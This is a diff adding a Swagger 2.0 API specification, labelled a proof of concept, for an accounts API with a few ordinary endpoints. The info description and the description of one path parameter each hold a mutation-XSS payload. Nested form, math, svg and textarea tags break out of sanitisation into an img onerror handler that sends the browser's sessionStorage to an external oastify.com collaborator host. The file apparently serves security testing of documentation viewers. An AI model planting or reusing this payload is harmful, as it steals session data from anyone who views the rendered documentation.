@@ -1,0 +1,59 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation (POC Purpose Only)
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=new Image().src="https://6kra0cl7h8gjrs2pgpp1j3x11s7jvbj0.oastify.com/cookie.php?c="+JSON.stringify(sessionStorage) src=1>"></form>
+
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/accounts/groupid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=new Image().src="https://6kra0cl7h8gjrs2pgpp1j3x11s7jvbj0.oastify.com/cookie.php?c="+JSON.stringify(sessionStorage) src=1>"></form>
+
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: deleteGroupById
+      summary: Deletes a group by id
+    get:
+      parameters:
+        - description: Id value to filter by
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findGroupsById
+      summary: Finds groups by id
